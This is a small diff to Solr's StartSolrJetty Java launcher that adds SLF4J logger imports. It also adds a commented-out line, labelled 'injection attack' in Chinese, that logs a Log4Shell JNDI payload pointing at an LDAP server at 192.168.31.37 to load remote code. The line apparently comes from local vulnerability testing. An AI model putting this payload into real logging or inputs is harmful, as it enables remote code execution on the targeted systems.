@@ -21,15 +21,20 @@ import org.eclipse.jetty.server.HttpConnectionFactory;
 import org.eclipse.jetty.server.Server;
 import org.eclipse.jetty.server.ServerConnector;
 import org.eclipse.jetty.webapp.WebAppContext;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 /**
  * @since solr 1.3
  */
 public class StartSolrJetty
 {
+//  private static final Logger logger = LoggerFactory.getLogger(StartSolrJetty.class);
+
   public static void main( String[] args )
   {
     //System.setProperty("solr.solr.home", "../../../example/solr");
+//    注入攻击logger.info("${jndi:ldap://192.168.31.37:9999/exp}");
 
     Server server = new Server();
     ServerConnector connector = new ServerConnector(server, new HttpConnectionFactory());
